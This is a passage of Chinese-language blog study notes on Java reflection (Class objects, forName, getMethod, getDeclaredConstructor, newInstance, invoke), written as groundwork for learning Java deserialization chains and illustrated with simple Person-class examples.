    <content type="html"><![CDATA[<blockquote><p>该博客为参考学习笔记博客，仅为本人记录的笔记，所以欢迎大家去<code>Drunkbaby</code>师傅的博客中进行学习！<a href="https://drun1baby.top/">Drunkbaby’s Blog</a></p></blockquote><p>参考链接：<a href="https://drun1baby.top/2022/05/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-02-Java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE%E5%88%86%E6%9E%90/">Java反序列化基础篇-02-Java 反射与 URLDNS 链分析</a></p><h1 id="一、Java反射的概念"><a href="#一、Java反射的概念" class="headerlink" title="一、Java反射的概念"></a>一、Java反射的概念</h1><h2 id="1-1-正射与反射"><a href="#1-1-正射与反射" class="headerlink" title="1.1 正射与反射"></a>1.1 正射与反射</h2><ul><li>正射</li></ul><p>我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>student.doHomework(<span class="hljs-string">&quot;数学&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>反射</li></ul><p>反射就是，一开始并不知道我们要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。我们以这一段经典的反射代码为例说明。</p><p>在上一篇中所讲的Person.java中的Person类，我们新建一个ReflectionTest.java文件来获取<code>Class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> p.getClass();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>接下来的重点问题在于如何理解<code>Class</code>是什么</p></blockquote><h2 id="1-2-反射的理解"><a href="#1-2-反射的理解" class="headerlink" title="1.2 反射的理解"></a>1.2 反射的理解</h2><ul><li>反射的作用：让 Java 具有动态性</li></ul><p>Java 的<strong>反射机制</strong>是指在&#x3D;&#x3D;运行状态&#x3D;&#x3D;中，对于任意一个类都能够知道这个类所有的属性和方法； 并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为 Java 语言的反射机制。</p><p>以下是<code>Drunkbaby</code>师傅的原文：</p><p>Java 本身是一种静态语言，为什么这么说，看这一段代码就知道了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure><p>那反过来，什么是动态语言呢？PHP 本身就拥有很多动态特性，我们来看这一段代码。在这一段代码里面，我们输入 <code>eval</code>，php 就执行 <code>eval</code> 命令；输入 <code>echo</code> 就执行 <code>echo</code> 命令；这就是语言的动态特性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>()<span class="hljs-meta">?&gt;</span>)<br></code></pre></td></tr></table></figure><h2 id="1-3-Java-Class对象的理解"><a href="#1-3-Java-Class对象的理解" class="headerlink" title="1.3 Java Class对象的理解"></a>1.3 Java Class对象的理解</h2><p>我们程序在运行的时候会编译生成一个 <code>.class</code> 文件，而这个 <code>.class</code> 文件中的内容就是相对应的类的所有信息，比如这段程序当中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> person.getClass();<br>&#125;<br></code></pre></td></tr></table></figure><p>其实 **<code>person.class</code> 就是 <code>Class</code>**，Class 也就是描述类的类。</p><p><strong>Class 类的对象作用</strong>是运行时提供或获得某个对象的类型信息。</p><blockquote><p>所以反射其实就是操作 <code>Class</code>，看清楚了，是大 C</p></blockquote><h1 id="二、Java反射运用"><a href="#二、Java反射运用" class="headerlink" title="二、Java反射运用"></a>二、Java反射运用</h1><h2 id="2-1-反射组成相关的类"><a href="#2-1-反射组成相关的类" class="headerlink" title="2.1  反射组成相关的类"></a>2.1  反射组成相关的类</h2><p>反射机制相关操作一般位于java.lang.reflect包中。</p><p>java反射机制组成需要重点注意以下的类：</p><ul><li><p>java.lang.Class：类对象;</p></li><li><p>java.lang.reflect.Constructor：类的构造器对象;</p></li><li><p>java.lang.reflect.Field：类的属性对象;</p></li><li><p>java.lang.reflect.Method：类的方法对象;</p></li></ul><h2 id="2-2-反射的使用方法"><a href="#2-2-反射的使用方法" class="headerlink" title="2.2 反射的使用方法"></a>2.2 反射的使用方法</h2><p>一些比较常用的反射函数，配合着在反序列化中实现弹shell等等的操作；</p><ul><li><p>获取类的方法：forName</p></li><li><p>实例化类对象的方法：newInstance</p></li><li><p>获取函数的方法：getMethod</p></li><li><p>执行函数的方法：invoke</p></li></ul><h3 id="1-首先需要实例化对象"><a href="#1-首先需要实例化对象" class="headerlink" title="1. 首先需要实例化对象"></a>1. 首先需要实例化对象</h3><p>对于普通用户我们可以采用以下方法创建实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br></code></pre></td></tr></table></figure><p>而我们在创建 Class 类的实例对象却不能使用上述方法，运行会抛出错误</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>();<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407281911139.png" alt="image-20240728191119009"></p><p>因为 Class 类是 <code>private</code> 私有属性，我们也无法通过创建对象的方式来获取 class 对象，那么我们怎样才能够获取到 class 对象呢？一般我们获取 class 对象就有以下三种方法，我们来逐一看看。</p><ol><li>实例化对象的getClass()方法</li></ol><p>如果上下文中存在某个类的示例<code>obj</code>，那么我们可以通过obj.getClass()来获取它的Class；例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">pClass</span> <span class="hljs-operator">=</span> p.getClass();<br></code></pre></td></tr></table></figure><ol start="2"><li>使用类的.class方法</li></ol><p>如果你已经加载了某个类，只是想获取到它的 <code>java.lang.Class</code> 对象，那么就直接拿它的 <code>class</code> 属性即可。这个⽅法其实不属于反射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 该类中必须导入Person类</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br></code></pre></td></tr></table></figure><ol start="3"><li>Class.forName(String className)：动态加载类</li></ol><p>如果你知道某个类的名字，想获取到这个类，就可以使⽤ <code>forName</code> 来获取，后续要利用的话是需要实例化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">psClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mango.serialize.Person&quot;</span>);<br></code></pre></td></tr></table></figure><p>以上是三种获取Class的方法，我们在写一个简单的示例去演示获取Class;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.reflection;<br><br><span class="hljs-keyword">import</span> com.mango.serialize.Person;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflection.reflectionTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/28 14:33</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflectionTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 方法一：实例化对象的getClass()方法</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">class1</span> <span class="hljs-operator">=</span> p.getClass();<br>        System.out.println(class1.getName());<br><br>        <span class="hljs-comment">// 方法2：使用类的.class方法</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">class2</span> <span class="hljs-operator">=</span> Person.class;<br>        System.out.println(class2.getName());<br><br>        <span class="hljs-comment">// 方法3：Class.forName(String className)：动态加载类</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">class3</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mango.serialize.Person&quot;</span>);<br>        System.out.println(class3.getName());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407281920804.png" alt="image-20240728192036688"></p><h3 id="2-获取成员变量Field"><a href="#2-获取成员变量Field" class="headerlink" title="2. 获取成员变量Field"></a>2. 获取成员变量Field</h3><p>获取成员变量Field位于 <code>java.lang.reflect.Field</code> 包中</p><ul><li><p>Field[] getFields() ：获取所有 public 修饰的成员变量</p></li><li><p>Field[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符</p></li><li><p>Field getField(String name) 获取指定名称的 public 修饰的成员变量</p></li><li><p>Field getDeclaredField(String name) 获取指定的成员变量</p></li></ul><h3 id="3-获取成员方法Method"><a href="#3-获取成员方法Method" class="headerlink" title="3. 获取成员方法Method"></a>3. 获取成员方法Method</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-comment">//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型</span><br><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getMethod</span><span class="hljs-params">(String name, <span class="hljs-keyword">Class</span>&lt;?&gt;... parameterTypes)</span> //返回该类所声明的<span class="hljs-title function_">public</span>方法<br><span class="hljs-title function_">Method</span> <span class="hljs-title function_">getDeclaredMethod</span><span class="hljs-params">(String name, <span class="hljs-keyword">Class</span>&lt;?&gt;... parameterTypes)</span> //返回该类所声明的所有方法<br><br><br><span class="hljs-title function_">Method</span>[] <span class="hljs-title function_">getMethods</span><span class="hljs-params">()</span> //获取所有的<span class="hljs-title function_">public</span>方法，包括类自身声明的<span class="hljs-title function_">public</span>方法，父类中的<span class="hljs-title function_">public</span>方法、实现的接口方法<br><span class="hljs-title function_">Method</span>[] <span class="hljs-title function_">getDeclaredMethods</span><span class="hljs-params">()</span> // 获取该类中的所有方法<br></code></pre></td></tr></table></figure><p>在<strong>Person.java</strong>中添加以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">(String s)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;studying&quot;</span> + s);<br>&#125;<br><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sleep</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;sleeping&quot;</span> + age);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;sleeping&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>新建java文件<strong>reflectionTest2.java</strong>写入以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflection.reflectionTest2.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/28 22:41</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflectionTest2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mango.serialize.Person&quot;</span>);<br>        Method[] methods1 = c1.getDeclaredMethods();<br>        Method[] methods2 = c1.getMethods();<br><br>        <span class="hljs-keyword">for</span>(Method m : methods1)&#123;<br>            System.out.println(m);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;---------------分割线---------------&quot;</span>);<br><br>        <span class="hljs-keyword">for</span>(Method m : methods2)&#123;<br>            System.out.println(m);<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;---------------分割线---------------&quot;</span>);<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method3</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;study&quot;</span>, String.class);   <span class="hljs-comment">//获取public的study方法</span><br>        System.out.println(method3);<br>        System.out.println(<span class="hljs-string">&quot;---------------分割线---------------&quot;</span>);<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method4</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-type">int</span>.class);<br>        System.out.println(method4);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407282251093.png" alt="image-20240728225102963"></p><h3 id="4-获取构造函数Constructor"><a href="#4-获取构造函数Constructor" class="headerlink" title="4. 获取构造函数Constructor"></a>4. 获取构造函数Constructor</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Constructor&lt;?&gt;[] getConstructors() ：只返回<span class="hljs-keyword">public</span>构造函数<br>Constructor&lt;?&gt;[] getDeclaredConstructors() ：返回所有构造函数<br>Constructor&lt;&gt; getConstructor(Class&lt;?&gt;... parameterTypes) : 匹配和参数配型相符的<span class="hljs-keyword">public</span>构造函数<br>Constructor&lt;&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes) ： 匹配和参数配型相符的构造函数<br></code></pre></td></tr></table></figure><p>新建一个java文件<strong>PersonConstructor.java</strong>并编写以下代码内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.entity;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.entity.PersonConstructor.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/28 22:59</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonConstructor</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">PersonConstructor</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">PersonConstructor</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PersonConstructor</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;PersonConstructor&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>新建一个java文件<strong>reflectionTest03.java</strong>并编写以下代码内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflection.reflectionTest03.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/28 23:04</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflectionTest03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mango.entity.PersonConstructor&quot;</span>);<br>        Constructor[] constructors1 = c.getDeclaredConstructors();<br>        Constructor[] constructors2 = c.getConstructors();<br>        <span class="hljs-keyword">for</span> (Constructor con : constructors1)&#123;<br>            System.out.println(con);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;---------------分割线---------------&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Constructor con : constructors2)&#123;<br>            System.out.println(con);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;---------------分割线---------------&quot;</span>);<br><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor3</span> <span class="hljs-operator">=</span> c.getConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        System.out.println(constructor3);<br>        System.out.println(<span class="hljs-string">&quot;---------------分割线---------------&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor4</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(String.class);<br>        System.out.println(constructor4);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407282309088.png" alt="image-20240728230935998"></p><h2 id="2-3-反射创建实例对象"><a href="#2-3-反射创建实例对象" class="headerlink" title="2.3 反射创建实例对象"></a>2.3 反射创建实例对象</h2><p>反射创建对象，也叫做<strong>做反射之后实例化对象</strong>，这里用到的是我们之前讲过的 <code>newInstance()</code> 方法</p><ul><li>实例化的一般步骤</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;ClassName&quot;</span>);<span class="hljs-comment">//获取Class对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> c.newInstance();<span class="hljs-comment">// 创建对象实例</span><br></code></pre></td></tr></table></figure><p>这里再介绍以下<code>invoke</code>方法，<code>invoke</code>方法位于 java.lang.reflect.Method 类中，用于执行某个的对象的目标方法。一般会和<code>getMethod</code>方法配合进行调用函数；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object obj, Object... args)</span><br></code></pre></td></tr></table></figure><p>第一个参数为类的实例，第二个参数为相应函数中的参数</p><ul><li><p>obj：从中调用底层方法的对象，必须是实例化对象</p></li><li><p>args： 用于方法的调用，是一个 object 的数组，参数有可能是多</p></li></ul><p>但需要注意的是，invoke 方法第一个参数并不是固定的：</p><ol><li><strong>如果调用这个方法是普通方法，第一个参数就是类对象；</strong></li><li><strong>如果调用这个方法是静态方法，第一个参数就是类；</strong></li></ol><p>首先在<code>Person.java</code>中加入方法<code>instance</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">instance</span><span class="hljs-params">()</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;newInstance！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们重新创建一个文件<code>reflectionTest04.java</code>编辑代码举例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.reflection;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflection.reflectionTest04.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/29 17:34</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflectionTest04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mango.entity.Person&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;instance&quot;</span>);<br>        method.invoke(o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407291740463.png" 